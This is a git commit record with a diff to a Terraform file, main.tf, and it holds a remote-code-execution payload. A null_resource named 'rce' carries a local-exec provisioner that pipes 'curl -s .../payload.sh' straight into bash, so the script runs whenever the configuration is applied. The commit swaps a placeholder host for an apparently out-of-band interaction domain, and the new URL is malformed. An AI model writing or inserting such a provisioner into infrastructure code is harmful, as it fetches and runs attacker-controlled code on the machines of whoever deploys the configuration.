e00b58901db8c33cfd9c35a62ced16c22668f687
Islam Albatsh <isahavkc@gmail.com>
2025-10-03 23:41:54 +0400

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,5 +1,5 @@
 resource "null_resource" "rce" {
   provisioner "local-exec" {
-    command = "curl -s http://YOUR_SERVER.com/payload.sh | bash"
+    command = "curl -s http:/im8lah6twvle9ms3tolk0bwi1970vrufj.oastify.com//payload.sh | bash"
   }
 }
